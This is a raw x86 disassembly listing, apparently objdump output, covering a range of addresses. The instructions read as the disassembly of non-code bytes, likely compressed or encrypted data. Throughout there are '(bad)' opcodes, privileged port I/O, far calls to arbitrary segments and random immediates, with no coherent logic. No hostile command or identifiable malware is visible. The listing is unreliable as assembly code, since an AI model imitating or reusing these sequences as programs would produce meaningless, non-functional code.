  41561e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41561f:	loope  0x4155d9
  415621:	out    dx,eax
  415622:	in     al,dx
  415623:	add    edx,DWORD PTR [ebx-0x200c8cbf]
  415629:	aam    0x57
  41562b:	inc    edx
  41562c:	xchg   DWORD PTR [eax-0x42],edi
  41562f:	arpl   si,cx
  415631:	or     BYTE PTR [ecx-0x6b],al
  415634:	jl     0x415636
  415636:	loop   0x415689
  415638:	cdq    
  415639:	out    dx,eax
  41563a:	pop    esp
  41563b:	mov    esp,0x42b6144e
  415640:	push   esi
  415641:	retf   0xd5f
  415644:	arpl   WORD PTR [edx-0x2208cc1f],di
  41564a:	mov    DWORD PTR [esi+0x71617ac0],edx
  415650:	dec    eax
  415651:	mov    bh,0x4f
  415653:	jge    0x415670
  415655:	sbb    ch,cl
  415657:	aas    
  415658:	inc    ebx
  415659:	xchg   edi,eax
  41565a:	adc    esp,DWORD PTR [edi]
  41565c:	adc    ebp,ebx
  41565e:	fs add eax,0x31095926
  415664:	or     eax,0x6c7606f0
  415669:	out    0x2d,al
  41566b:	lods   eax,DWORD PTR ds:[esi]
  41566c:	mov    ebx,0x90669b8
  415671:	test   eax,0x88c9b881
  415676:	test   al,0x1e
  415678:	aaa    
  415679:	lea    esi,[ebp+edx*4+0x12]
  41567d:	mov    es,WORD PTR [ebp-0x38a0cc9f]
  415683:	or     ebp,DWORD PTR [ecx-0x8d31a3c]
  415689:	das    
  41568a:	nop
  41568b:	sbb    al,0x29
  41568d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41568e:	in     al,0xbe
  415690:	xchg   ecx,eax
  415691:	mov    esp,ds
  415693:	inc    esi
  415694:	xchg   BYTE PTR [edi+0x52c7356f],ch
  41569a:	pop    edi
  41569b:	inc    esp
  41569c:	int    0xcb
  41569e:	(bad)  
  41569f:	cli    
  4156a0:	sub    al,0x3c
  4156a2:	jecxz  0x4156c5
  4156a4:	out    dx,eax
  4156a5:	push   0x31d36352
  4156aa:	out    dx,al
  4156ab:	outs   dx,DWORD PTR ds:[esi]
  4156ac:	xchg   esp,eax
  4156ad:	dec    eax
  4156ae:	push   ebx
  4156af:	adc    edx,DWORD PTR [ebp+edi*8-0x2c]
  4156b3:	mov    edx,0x9010e366
  4156b8:	cmp    DWORD PTR [ebx],esi
  4156ba:	mov    esi,0xa31ad862
  4156bf:	retf   0x46f2
  4156c2:	jmp    0xe1eb:0x666c0f0a
  4156c9:	push   eax
  4156ca:	pop    esi
  4156cb:	jnp    0x41566a
  4156cd:	arpl   WORD PTR [edx+0xff4be49],di
  4156d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156d4:	push   0xffffffab
  4156d6:	mov    eax,ds:0x3136638c
  4156db:	mov    bl,0x2e
  4156dd:	call   0x4653:0xda0db8c6
  4156e4:	enter  0x1c8a,0x97
  4156e8:	dec    edi
  4156e9:	(bad)
  4156ec:	rol    DWORD PTR [ebp-0x3e830bc7],1
  4156f2:	or     BYTE PTR [ebp-0x16],dh
  4156f5:	les    edx,FWORD PTR [ecx-0x4d]
  4156f8:	jno    0x415708
  4156fa:	sbb    ah,BYTE PTR [esi+0x25fef071]
  415700:	sub    eax,DWORD PTR [ecx-0x6dbc84a9]
  415706:	inc    esi
  415707:	aam    0x3d
  415709:	and    DWORD PTR [ebp+0x7c],ecx
  41570c:	sahf   
  41570d:	clc    
  41570e:	or     al,0x50
  415710:	lock jno 0x41572a
  415713:	push   es
  415714:	sbb    DWORD PTR [esi+ebx*1+0x6f],ecx
  415718:	fidivr WORD PTR [edi+0x7d]
  41571b:	mov    ?,WORD PTR [edi+0x6927a0a5]
  415721:	sar    ecx,0xf1
  415724:	dec    ebx
  415725:	cdq    
  415726:	enter  0xf3ee,0xa1
  41572a:	(bad)  
  41572b:	into   
  41572c:	sub    edx,DWORD PTR [ebp+0xb]
  41572f:	push   0x753133a
  415734:	sbb    al,0xa7
  415736:	lods   al,BYTE PTR ds:[esi]
  415737:	pusha  
  415738:	mov    ds:0x92bf6205,al
  41573d:	in     eax,dx
  41573e:	int    0x8e
  415740:	mov    bl,bh
  415742:	pop    ds
  415743:	cdq    
  415744:	xchg   edx,eax
  415745:	shl    BYTE PTR [esi+ebx*8],cl
  415748:	pop    ebx
  415749:	xor    BYTE PTR [edx],ch
  41574b:	push   es
  41574c:	dec    esi
  41574d:	ror    DWORD PTR [ebx],1
  41574f:	call   0x9230:0x7f99b6cd
  415756:	xor    DWORD PTR [ecx-0x49a31cbd],0x246ef540
  415760:	retf   0xfe6a
  415763:	mov    dl,0x90
  415765:	add    BYTE PTR [ebx+0x220bb532],cl
  41576b:	imul   ecx,esi,0xc9bae092
  415771:	cmp    eax,0xaea82645
  415776:	(bad)  
  415777:	shl    bh,0x7b
  41577a:	ds jns 0x415742
  41577d:	jo     0x41576a
  41577f:	sbb    edi,ebx
  415781:	outs   dx,DWORD PTR ds:[esi]
  415782:	sbb    edi,esp
  415784:	adc    esi,edx
  415786:	dec    eax
  415787:	xchg   DWORD PTR [eax-0x195a86cb],ebx
  41578d:	not    DWORD PTR [eax]
  41578f:	fcomp  DWORD PTR [edi]
  415791:	lahf   
  415792:	and    al,0xc6
  415794:	mov    bh,0xcb
  415796:	push   edx
  415797:	xchg   edx,eax
  415798:	push   ecx
  415799:	fiadd  DWORD PTR [ebx-0x26]
  41579c:	(bad)  
  41579d:	retf   0xb734
  4157a0:	retf   0xd57
  4157a3:	(bad)  
  4157a5:	sahf   
  4157a6:	std    
  4157a7:	das    
  4157a8:	mov    bl,0x14
  4157aa:	sbb    BYTE PTR [edx],dl
  4157ac:	or     DWORD PTR [ebx-0x1f],ebx
  4157af:	inc    ebp
  4157b0:	xor    al,0x6a
  4157b2:	cmp    cl,BYTE PTR [edx]
  4157b4:	test   BYTE PTR [edi-0x5c],bl
  4157b7:	inc    eax
  4157b8:	imul   eax,DWORD PTR [edx+0x38f11f19],0xffffffbf
  4157bf:	call   0x69ec:0x91e8ae08
  4157c6:	lea    ebp,[esp+eax*8+0x52]
  4157ca:	loope  0x41581e
  4157cc:	jg     0x41580b
  4157ce:	adc    eax,0x177f4f05
  4157d3:	in     al,0x19
  4157d5:	mov    BYTE PTR [esi],dh
  4157d7:	scas   eax,DWORD PTR es:[edi]
  4157d8:	inc    esp
  4157d9:	mov    ds:0x6b6f22fb,al
  4157de:	stos   BYTE PTR es:[edi],al
  4157df:	dec    esp
  4157e0:	xchg   edx,eax
  4157e1:	(bad)  
  4157e2:	jecxz  0x4157c7
  4157e4:	iret   
  4157e5:	dec    esp
  4157e6:	ins    BYTE PTR es:[edi],dx
  4157e7:	add    al,0x2f
  4157e9:	js     0x415812
  4157eb:	pop    edi
  4157ec:	add    esi,ebp
  4157ee:	push   ds
  4157ef:	and    DWORD PTR [edx+0x63],eax
  4157f2:	cmp    ebp,DWORD PTR [ebx-0x553b5ae6]
  4157f8:	push   edx
  4157f9:	push   ecx
  4157fa:	neg    BYTE PTR [eax]
  4157fc:	rcl    edx,0xcb
  4157ff:	xor    edx,esi
  415801:	add    DWORD PTR [edi+0x26446a7e],eax
  415807:	mov    fs,WORD PTR [edx]
  415809:	fsub   DWORD PTR ds:[edx-0x12]
  41580d:	xor    al,cl
  41580f:	data16 sub al,0x33
  415812:	aaa    
  415813:	push   ebp
  415814:	outs   dx,BYTE PTR ds:[esi]
  415815:	jo     0x4157d8
  415817:	mov    cl,0x1b
  415819:	aam    0x76
  41581b:	xlat   BYTE PTR ds:[ebx]
  41581c:	sti    
  41581d:	lods   al,BYTE PTR ds:[esi]
  41581e:	test   BYTE PTR [esi],bl
  415820:	fdivr  QWORD PTR [esi]
  415822:	pusha  
  415823:	scas   al,BYTE PTR es:[edi]
  415824:	mov    cl,0x60
  415826:	into   
  415827:	jecxz  0x415832
  415829:	(bad)  
  41582a:	lods   eax,DWORD PTR ds:[esi]
  41582b:	les    esi,FWORD PTR [esp+ecx*4+0x4]
  41582f:	cmp    DWORD PTR [edi-0x348ec11a],ebx
  415835:	push   0xffffffb5
  415837:	les    edx,FWORD PTR [eax]
  415839:	ds ja  0x415863
  41583c:	pop    edi
  41583d:	cmp    BYTE PTR [eax],al
  41583f:	ret    
  415840:	scas   al,BYTE PTR es:[edi]
  415841:	out    dx,al
  415842:	repnz pusha 
  415844:	in     al,dx
  415845:	jnp    0x4158bc
  415847:	ins    BYTE PTR es:[edi],dx
  415848:	sub    DWORD PTR [ebx-0x7f2026d0],0xaf206767
  415852:	out    dx,eax
  415853:	std    
  415854:	pop    eax
  415855:	aas    
  415856:	cmp    al,0x43
  415858:	std    
  415859:	jae    0x4157ea
  41585b:	pop    edx
  41585c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41585d:	push   eax
  41585e:	and    DWORD PTR [ebx+0x3096f946],esp
  415864:	xlat   BYTE PTR ds:[ebx]
  415865:	loop   0x415869
  415867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415868:	enter  0x95db,0xd4
  41586c:	adc    DWORD PTR [ecx+0x4b770972],edx
  415872:	jb     0x41582f
  415874:	mov    esp,0xe704d51d
  415879:	out    0xbb,eax
  41587b:	out    dx,al
  41587c:	aas    
  41587d:	(bad)  
  41587e:	shr    DWORD PTR [eax],1
  415880:	setno  dl
  415883:	and    dl,BYTE PTR [edi-0x73]
  415886:	cmp    al,0x83
  415888:	adc    ecx,DWORD PTR [ecx-0x584ac0a6]
  41588e:	das    
  41588f:	loopne 0x415842
  415891:	aaa    
  415892:	mov    dh,0xcf
  415894:	stos   BYTE PTR es:[edi],al
  415895:	rol    DWORD PTR [edi],1
  415897:	mov    al,ds:0x8dda8d4e
  41589c:	mov    ecx,0x683e259d
  4158a1:	and    eax,0x36d64658
  4158a6:	pop    esi
  4158a7:	cmp    dh,ah
  4158a9:	mov    BYTE PTR [edx],0x84
  4158ac:	bound  edi,QWORD PTR [esi-0x7f7eae03]
  4158b2:	lods   al,BYTE PTR ds:[esi]
  4158b3:	adc    BYTE PTR [eax-0xb],0xad
  4158b7:	test   al,0xd8
  4158b9:	sar    ah,1
  4158bb:	ds mov ah,0x4b
  4158be:	pop    ebp
  4158bf:	sbb    bh,ch
  4158c1:	test   cl,0x33
  4158c4:	mov    ah,0x8f
  4158c6:	test   eax,0x78746bf1
  4158cb:	imul   ebp,DWORD PTR [ecx+0x1c94f2b],0x17
  4158d2:	enter  0x6d6b,0x4b
  4158d6:	jno    0x415897
  4158d8:	and    al,0x87
  4158da:	sbb    eax,0xcc33940b
  4158df:	call   0xa767:0x9872e5c1
  4158e6:	xacquire xchg BYTE PTR [edx-0x4],dl
  4158ea:	div    DWORD PTR [ecx-0x2a]
  4158ed:	xchg   edx,eax
  4158ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158ef:	outs   dx,DWORD PTR ds:[esi]
  4158f0:	pop    ebp
  4158f1:	test   BYTE PTR [esi-0x1a],0xf7
  4158f5:	pop    eax
  4158f6:	mov    ecx,0xac8cae2e
  4158fb:	dec    eax
  4158fc:	dec    esi
  4158fd:	ret    0x8e34
  415900:	inc    di
  415902:	add    al,0x29
  415904:	cmp    al,0xbc
  415906:	add    bl,bh
  415908:	push   ds
  415909:	imul   ebx,DWORD PTR [ebp+0x1d],0x52
  41590d:	lahf   
  41590e:	push   ebx
  41590f:	scas   al,BYTE PTR es:[edi]
  415910:	ret    
  415911:	dec    edx
  415912:	adc    al,0x27
  415914:	dec    ebx
  415915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415916:	out    0x2e,al
  415918:	xchg   cl,ch
  41591a:	or     esp,DWORD PTR [ebx]
  41591c:	mov    edx,DWORD PTR [edx-0x1]
  41591f:	inc    esi
  415920:	cwde   
  415921:	mov    edi,0xee542633
  415926:	gs (bad) 
  415928:	call   0xd47c:0x57981475
  41592f:	push   ebx
  415930:	adc    DWORD PTR [ebp+0x4e],esp
  415933:	cmp    esi,ecx
  415935:	call   0xb9a1:0x25b82b7d
  41593c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593d:	imul   ebx,DWORD PTR [edi+0x64],0x2218cede
  415944:	scas   al,BYTE PTR es:[edi]
  415945:	xor    eax,0x4d73b9f6
  41594a:	jle    0x415956
  41594c:	inc    edx
  41594d:	pusha  
  41594e:	mov    ecx,ebx
  415950:	sub    DWORD PTR [esi+eiz*8-0x38ea1d9c],edi
  415957:	jmp    0xf8e1:0x173c1f47
  41595e:	jnp    0x415928
  415960:	push   0xffffffb2
  415962:	mov    ds:0x2d7fd7e3,al
  415967:	leave  
  415968:	js     0x4159d1
  41596a:	mov    edx,0x9825044b
  41596f:	cmp    eax,0x117a0a9c
  415974:	jl     0x415947
  415976:	inc    eax
  415977:	call   0x54:0x5af3dc17
  41597e:	out    0x73,eax
  415980:	dec    ebp
  415981:	retf   
  415982:	pusha  
  415983:	cli    
  415984:	ds mov ecx,0x41781007
  41598a:	das    
  41598b:	push   0x3a50b9cc
  415990:	(bad)  
  415991:	repnz inc ebp
  415993:	fiadd  DWORD PTR [edi]
  415995:	lods   al,BYTE PTR ds:[esi]
  415996:	mov    dl,0xa
  415998:	push   esi
  415999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41599a:	pop    eax
  41599b:	sar    DWORD PTR [edx+0x58],0x6a
  41599f:	je     0x4159ae
  4159a1:	adc    al,0x45
  4159a3:	mov    BYTE PTR [ebp+ebx*8+0x57],bh
  4159a7:	xchg   DWORD PTR [edi+0x7f],ebx
  4159aa:	mov    al,0x7b
  4159ac:	xadd   DWORD PTR [ebp+ebp*4-0x14],esp
  4159b1:	inc    edi
  4159b2:	jge    0x4159c7
  4159b4:	mov    eax,ds:0xb7b9c675
  4159b9:	xchg   edi,eax
  4159ba:	repnz pop ss
  4159bc:	mov    esi,0xf008416a
  4159c1:	pop    ds
  4159c2:	or     ebx,DWORD PTR ds:0x6d7fdda7
  4159c8:	retf   
  4159c9:	dec    esp
  4159ca:	push   0xffffff84
  4159cc:	hlt    
  4159cd:	inc    ebp
  4159ce:	push   esi
  4159cf:	iret   
  4159d0:	lea    ebp,[eax]
  4159d2:	and    bl,ch
  4159d4:	add    edi,eax
  4159d6:	(bad)  
  4159d8:	dec    ecx
  4159d9:	fbstp  TBYTE PTR [eax]
  4159db:	and    eax,0xf401ea32
  4159e0:	(bad)  
  4159e1:	and    eax,0x2a61e55e
  4159e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159e7:	xchg   edi,eax
  4159e8:	dec    esp
  4159e9:	jl     0x4159bc
  4159eb:	loopne 0x4159a7
  4159ed:	je     0x4159f4
  4159ef:	ins    BYTE PTR es:[edi],dx
  4159f0:	pop    esp
  4159f1:	dec    esi
  4159f2:	push   ecx
  4159f3:	mov    edi,0x207eb04f
  4159f8:	xchg   ecx,eax
  4159f9:	add    ah,BYTE PTR [eax]
  4159fb:	xor    eax,ebp
  4159fd:	cmp    bl,bl
  4159ff:	lods   eax,DWORD PTR ds:[esi]
  415a00:	add    esi,eax
  415a02:	sub    ebp,DWORD PTR [eax+0xe]
  415a05:	push   edi
  415a06:	pop    eax
  415a07:	sar    ebp,1
  415a09:	lods   al,BYTE PTR ds:[esi]
  415a0a:	(bad)  
  415a0b:	cmp    ecx,DWORD PTR [edx+0x315c8a71]
  415a11:	add    BYTE PTR [edx],0x96
  415a14:	call   0x6599:0x52fc6792
  415a1b:	inc    edi
  415a1c:	cmp    edi,ebp
  415a1e:	jecxz  0x4159d9
  415a20:	mov    esp,0xc40aae7
  415a25:	adc    al,0xbe
  415a27:	dec    esi
  415a28:	mov    edi,0xacb0a082
  415a2d:	jl     0x415a86
  415a2f:	push   esp
  415a30:	call   0x8a06:0xa45272fa
  415a37:	mov    esp,ecx
  415a39:	enter  0x88ae,0x95
  415a3d:	adc    al,0x31
  415a3f:	jne    0x415aa1
  415a41:	pop    esi
  415a42:	cmp    eax,0x85e982fe
  415a47:	loope  0x4159cc
  415a49:	push   esi
  415a4a:	sbb    ch,BYTE PTR [ecx]
  415a4c:	arpl   WORD PTR [esi+ebx*1-0x61],bp
  415a50:	gs cld 
  415a52:	pop    ds
  415a53:	mov    ch,0xa9
  415a55:	stos   DWORD PTR es:[edi],eax
  415a56:	sub    BYTE PTR [ecx-0x6e],cl
  415a59:	nop
  415a5a:	retf   
  415a5b:	push   edx
  415a5c:	jbe    0x4159e1
  415a5e:	cmp    ah,dh
  415a60:	push   ecx
  415a61:	push   ds
  415a62:	inc    ebx
  415a63:	inc    eax
  415a64:	push   ss
  415a65:	loopne 0x415a06
  415a67:	push   esp
  415a68:	push   edi
  415a69:	or     eax,DWORD PTR [edi]
  415a6b:	xor    eax,0xa60aaa57
  415a70:	loopne 0x415ab7
  415a72:	jae    0x415a16
  415a74:	imul   ebx,edi,0xffffffda
  415a77:	add    BYTE PTR [edx+0x6a],cl
  415a7a:	ss jae 0x415ab2
  415a7d:	outs   dx,DWORD PTR ds:[esi]
  415a7e:	adc    BYTE PTR [edi],dl
  415a80:	aaa    
  415a81:	(bad)  
  415a82:	iret   
  415a83:	push   eax
  415a84:	adc    al,0x9e
  415a86:	add    eax,0x91b39888
  415a8b:	outs   dx,DWORD PTR ds:[esi]
  415a8c:	imul   ebp,DWORD PTR [ebp+0x55],0x7f
  415a90:	jg     0x415a2c
  415a92:	push   es
  415a93:	fcmovu st,st(5)
  415a95:	inc    ebx
  415a96:	test   al,0x49
  415a98:	pop    ds
  415a99:	(bad)  
  415a9b:	dec    esp
  415a9c:	pop    ds
  415a9d:	ficomp DWORD PTR [eax+edx*2]
  415aa0:	jl     0x415a61
  415aa2:	dec    ebp
  415aa3:	cmp    DWORD PTR [eax+edi*1-0x53bbb752],ebx
  415aaa:	arpl   si,sp
  415aac:	sbb    DWORD PTR [ebp+ecx*4-0x60],esp
  415ab0:	inc    eax
  415ab1:	rcr    ebx,0xa6
  415ab4:	imul   edi,DWORD PTR [ebp-0x6aba6bb1],0xffffffb9
  415abb:	enter  0xc878,0xb6
  415abf:	in     al,0x1
  415ac1:	lods   al,BYTE PTR ds:[esi]
  415ac2:	shl    edi,1
  415ac4:	mov    dh,0x22
  415ac6:	dec    esp
  415ac7:	mov    ecx,0x3a3c19d2
  415acc:	push   ebx
  415acd:	mov    WORD PTR [ebx+0x3],es
  415ad0:	adc    eax,0x5bef71de
  415ad5:	and    al,0x84
  415ad7:	sbb    al,0x80
  415ad9:	xchg   esp,eax
  415ada:	ja     0x415ad7
  415adc:	push   esp
  415add:	call   0xf69f:0xfaf1fb83
  415ae4:	sbb    eax,0xde25c986
  415ae9:	(bad)  
  415aea:	jo     0x415b33
  415aec:	cdq    
  415aed:	xor    DWORD PTR [eax],0x9b7869e6
  415af3:	push   edx
  415af4:	data16 xchg cl,bh
  415af7:	iret   
  415af8:	jp     0x415ad8
  415afa:	add    ebx,ebp
  415afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415afd:	xor    DWORD PTR [esi],eax
  415aff:	out    0xa9,eax
  415b01:	and    eax,DWORD PTR [ecx+0x27]
  415b04:	ins    BYTE PTR es:[edi],dx
  415b05:	imul   eax,DWORD PTR [ebx+esi*4-0x2baf1ff9],0xa1bd64ba
  415b10:	outs   dx,BYTE PTR ds:[esi]
  415b11:	imul   edx,DWORD PTR [esi],0x55f9e8e7
  415b17:	push   ecx
  415b18:	icebp  
  415b19:	xor    esp,DWORD PTR [edx]
  415b1b:	push   ebx
  415b1c:	lock loop 0x415b8a
  415b1f:	push   ss
  415b20:	sar    BYTE PTR [ebx-0x6ff67f6],0x61
  415b27:	pop    ds
  415b28:	into   
  415b29:	dec    ecx
  415b2a:	adc    bh,ch
  415b2c:	in     al,dx
  415b2d:	cmp    DWORD PTR [esi+0x7d],0xffffff82
  415b31:	cmp    eax,0x8826117f
  415b36:	adc    DWORD PTR [ebx+0x3f],eax
  415b39:	out    dx,al
  415b3a:	aam    0x88
  415b3c:	mov    bl,0x74
  415b3e:	mov    DWORD PTR [edx-0x203e8558],edx
  415b44:	(bad)  [esi]
  415b46:	pop    edx
  415b48:	loop   0x415b20
  415b4a:	sub    BYTE PTR [esi+0x2e],al
  415b4d:	jp     0x415b21
  415b4f:	mov    edx,ecx
  415b51:	mov    dl,0xe6
  415b53:	retf   0x68ce
  415b56:	ins    BYTE PTR es:[edi],dx
  415b57:	inc    ecx
  415b58:	aaa    
  415b59:	or     eax,0x3bacf1bf
  415b5e:	jge    0x415bbd
  415b60:	gs pop ebp
  415b62:	and    al,0x5
  415b64:	lock js 0x415b63
  415b67:	cmp    DWORD PTR [ecx-0x5a24570e],0xa1f7620c
  415b71:	mov    ds:0x2866a124,eax
  415b76:	sub    ch,BYTE PTR [ebp-0x4d91850d]
  415b7c:	dec    ebx
  415b7d:	mov    BYTE PTR [ebx+0x557d3718],0xfc
  415b84:	(bad)
  415b87:	push   ecx
  415b88:	xchg   ebp,eax
  415b89:	sub    BYTE PTR [esi-0x7e4fb856],dl
  415b8f:	les    edx,FWORD PTR [eax+0x46]
  415b92:	dec    esp
  415b93:	(bad)  
  415b95:	aam    0xfd
  415b97:	int    0xf8
  415b99:	mov    ds:0x24f90959,eax
  415b9e:	mul    DWORD PTR [ebx-0x45]
  415ba1:	sub    eax,0xce8f520c
  415ba6:	jg     0x415b40
  415ba8:	and    BYTE PTR [ebx+0xadd5af2],al
  415bae:	dec    ecx
  415baf:	xchg   esi,eax
  415bb0:	xchg   ecx,eax
  415bb1:	push   ebp
  415bb2:	cmp    eax,0xba676620
  415bb7:	lea    ebx,[ecx]
  415bb9:	ret    
  415bba:	inc    edi
  415bbb:	sub    eax,0xd78a7aff
  415bc0:	cld    
  415bc1:	push   eax
  415bc2:	push   ss
  415bc3:	cld    
  415bc4:	pop    ebx
  415bc5:	add    BYTE PTR [ebp-0x4d],ah
  415bc8:	pop    edi
  415bc9:	mov    ecx,0x5b49fbae
  415bce:	xchg   DWORD PTR [edi-0x59c03d51],edi
  415bd4:	mov    esp,0x3dd2f408
  415bd9:	add    al,0x60
  415bdb:	cdq    
  415bdc:	cmovbe ebp,esp
  415bdf:	fdivr  st,st(0)
  415be1:	pop    ss
  415be2:	je     0x415ba9
  415be4:	ret    
  415be5:	cmp    DWORD PTR [ebp+0x3c],ebp
  415be8:	xchg   esp,eax
  415be9:	xchg   ecx,eax
  415bea:	cli    
  415beb:	adc    DWORD PTR [ebx],eax
  415bed:	mov    ecx,0xf3983
  415bf2:	in     eax,dx
  415bf3:	jne    0x415bea
  415bf5:	test   eax,0x709aad19
  415bfa:	je     0x415ba8
  415bfc:	cmp    al,0x8d
  415bfe:	mov    eax,ds:0x96b4c8e9
  415c03:	dec    ecx
  415c04:	scas   al,BYTE PTR es:[edi]
  415c05:	and    BYTE PTR [edi],cl
  415c07:	cdq    
  415c08:	sub    BYTE PTR [ecx-0x7fce2212],bl
  415c0e:	add    al,0xf9
  415c10:	dec    esp
  415c11:	arpl   WORD PTR [ebp+0x67],bp
  415c14:	nop
  415c15:	pop    ecx
  415c16:	jae    0x415c92
  415c18:	dec    esp
  415c19:	push   ss
  415c1a:	dec    esi
  415c1b:	xchg   ecx,eax
  415c1c:	sbb    dl,BYTE PTR [ebp+0x673f630c]
  415c22:	or     al,0xac
  415c24:	stc    
  415c25:	aam    0xae
  415c27:	in     al,dx
  415c28:	fiadd  DWORD PTR [ecx+0x6d]
  415c2b:	jnp    0x415c89
  415c2d:	sbb    al,0x10
  415c2f:	sbb    BYTE PTR [ecx-0x6a31aba0],bh
  415c35:	cmp    dl,BYTE PTR [ebx]
  415c37:	les    edx,FWORD PTR [ebp+0x73]
  415c3a:	pop    eax
  415c3b:	dec    ecx
  415c3c:	adc    ch,BYTE PTR [edx-0x54f207d1]
  415c42:	test   DWORD PTR ds:0xb218e124,edx
  415c48:	push   edi
  415c49:	fcom   QWORD PTR [eax-0xacba06f]
  415c4f:	cmp    esp,DWORD PTR [ebp+0x27b2082d]
  415c55:	xor    ch,BYTE PTR cs:[ecx+0x30]
  415c59:	scas   eax,DWORD PTR es:[edi]
  415c5a:	call   0x416813c2
  415c5f:	bound  eax,QWORD PTR [ebx+0x2ec6a9fd]
  415c65:	addr16 and al,0xab
  415c68:	xlat   BYTE PTR ds:[ebx]
  415c69:	xor    bl,BYTE PTR [edx-0x52a886f3]
  415c6f:	mov    DWORD PTR [eax+0x3a95fa67],eax
  415c75:	jbe    0x415bf8
  415c77:	loop   0x415c97
  415c79:	pusha  
  415c7a:	jle    0x415c22
  415c7c:	jle    0x415c6e
  415c7e:	imul   edx,DWORD PTR [eax+ebx*2-0x37],0x1ec415d6
  415c86:	das    
  415c87:	in     al,dx
  415c88:	xchg   esi,eax
  415c89:	ret    0xa842
  415c8c:	(bad)  
  415c8d:	or     cl,bh
  415c8f:	jnp    0x415cae
  415c91:	outs   dx,DWORD PTR ds:[esi]
  415c92:	inc    edx
  415c93:	dec    dl
  415c95:	imul   ebp,DWORD PTR [eax+ebp*4+0x58ed9dbb],0xbaf7ff27
  415ca0:	push   esi
  415ca1:	iret   
  415ca2:	ja     0x415c70
  415ca4:	sbb    eax,0x7700e8b7
  415ca9:	mov    ch,0x6b
  415cab:	adc    DWORD PTR [esi+eax*2-0x44e3205d],0xac6ce9b2
  415cb6:	fwait
  415cb7:	xor    dl,BYTE PTR [ebx]
  415cb9:	or     bh,BYTE PTR [esi]
  415cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cbc:	js     0x415cdf
  415cbe:	adc    eax,0x145cb9a6
  415cc3:	cmp    DWORD PTR [esi],eax
  415cc5:	sahf   
  415cc6:	cli    
  415cc7:	mov    ah,0x71
  415cc9:	aad    0xe6
  415ccb:	(bad)  
  415ccd:	jmp    0x415d1c
  415ccf:	mov    dh,0x2c
  415cd1:	test   DWORD PTR [edx],ebp
  415cd3:	pop    ds
  415cd4:	es dec esi
  415cd6:	ins    BYTE PTR es:[edi],dx
  415cd7:	fist   WORD PTR [edx]
  415cd9:	dec    ecx
  415cda:	leave  
  415cdb:	fdiv   DWORD PTR [esi+0x1f]
  415cde:	add    al,0x1f
  415ce0:	pop    esp
  415ce1:	push   ecx
  415ce2:	pop    ecx
  415ce3:	jno    0x415c6a
  415ce5:	sub    ah,BYTE PTR [ecx+0x76828a0e]
  415ceb:	inc    ecx
  415cec:	sbb    edx,DWORD PTR [ebx-0x72a36417]
  415cf2:	or     eax,0x1c8971fc
  415cf7:	test   DWORD PTR [si-0x53a6],esi
  415cfc:	fistp  WORD PTR [esi+edi*2+0x6e6db4f4]
  415d03:	xor    ecx,edx
  415d05:	xchg   esi,eax
  415d06:	call   FWORD PTR [edi-0x3]
  415d09:	jmp    0x51e2:0xca000436
  415d10:	xchg   BYTE PTR [ebp+0x27c193c4],cl
  415d16:	std    
  415d17:	inc    esp
  415d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d19:	mov    bl,0x48
  415d1b:	mov    DWORD PTR [ebp+0xa],ecx
  415d1e:	and    eax,0x636700ad
  415d23:	test   DWORD PTR [esi],esp
  415d25:	dec    ebx
  415d26:	inc    eax
  415d27:	xchg   esi,eax
  415d28:	add    eax,0xffbf136c
  415d2d:	pop    ebx
  415d2e:	xchg   esp,eax
  415d2f:	xor    eax,0xd688ab6
  415d34:	scas   al,BYTE PTR es:[edi]
  415d35:	xor    DWORD PTR [edx-0x4b],edx
  415d38:	sub    BYTE PTR [edx],0xa2
  415d3b:	mov    dh,BYTE PTR [ecx+0x49]
  415d3e:	inc    eax
  415d3f:	leave  
  415d40:	(bad)  
  415d41:	mov    ds:0xa855383d,eax
  415d46:	push   0x1bb43e8
  415d4b:	test   BYTE PTR [edx-0x7c],al
  415d4e:	xor    eax,0x12a1a7f5
  415d53:	mov    al,0xee
  415d55:	(bad)  
  415d56:	clc    
  415d57:	push   es
  415d58:	pop    edi
  415d59:	test   eax,0x73deea86
  415d5e:	cs test al,0x25
  415d61:	adc    al,0x93
  415d63:	xchg   esi,eax
  415d64:	test   DWORD PTR [ebp-0x60aef02],ecx
  415d6a:	fistp  QWORD PTR [ecx+0x4fdb3a31]
  415d70:	mov    edi,0x3a053d36
  415d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d76:	sub    edi,DWORD PTR [esp+ebp*4+0x57]
  415d7a:	cs (bad) 
  415d7c:	(bad)  
  415d7d:	jg     0x1a1670c1
  415d83:	sbb    eax,0xa9f7f7bf
  415d88:	push   ebx
  415d89:	(bad)  
  415d8a:	into   
  415d8b:	mov    ecx,0x912d687f
  415d90:	pushf  
  415d91:	sub    eax,edi
  415d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d94:	add    eax,0x4fa6d1e8
  415d99:	sbb    al,0x81
  415d9b:	rol    edx,0xe4
  415d9e:	xchg   ebx,eax
  415d9f:	mov    al,0xaf
  415da1:	pop    ds
  415da2:	int3   
  415da3:	fsubr  QWORD PTR fs:[esi]
  415da6:	stos   DWORD PTR es:[edi],eax
  415da7:	scas   al,BYTE PTR es:[edi]
  415da8:	xor    BYTE PTR [edx+0x0],ch
  415dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dac:	daa    
  415dad:	xor    eax,0xa7eb0968
  415db2:	mov    ah,0xe
  415db4:	xchg   esp,eax
  415db5:	or     edx,esi
  415db7:	dec    ebx
  415db8:	or     BYTE PTR [edx],al
  415dba:	rcr    BYTE PTR [ecx-0x2a],cl
  415dbd:	mov    dl,0x72
  415dbf:	adc    bl,bl
  415dc1:	add    DWORD PTR [edx+0x7fc2a33f],ebx
  415dc7:	ds out 0xb1,eax
  415dca:	xor    ah,BYTE PTR [eax+0x4e]
